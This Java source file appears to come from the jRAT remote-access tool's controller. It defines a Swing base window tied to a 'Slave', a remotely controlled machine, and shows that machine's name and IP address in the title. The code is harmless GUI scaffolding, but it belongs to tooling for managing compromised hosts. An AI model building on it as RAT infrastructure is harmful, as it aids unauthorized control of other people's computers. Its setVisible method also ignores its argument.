package io.jrat.controller.ui.frames;

import com.redpois0n.oslib.OperatingSystem;
import io.jrat.controller.Slave;
import javax.swing.JFrame;


@SuppressWarnings("serial")
public abstract class BaseFrame extends JFrame {

	protected Slave slave;
	
	public BaseFrame() {
		this(null);
	}
	
	public BaseFrame(Slave slave) {
		this.slave = slave;
	}

	@Override
	public void setVisible(boolean t) {
		super.setVisible(true);

		if (OperatingSystem.getOperatingSystem().getType() != OperatingSystem.WINDOWS) {
			super.pack();
		}
	}
	
	public void setTitle(String s) {
		if (slave != null) {
			super.setTitle(s + " - [" + slave.getDisplayName() + "] - " + slave.getIP());
		} else {
			super.setTitle(s);
		}
	}
	
	public Slave getSlave() {
		return slave;
	}

}
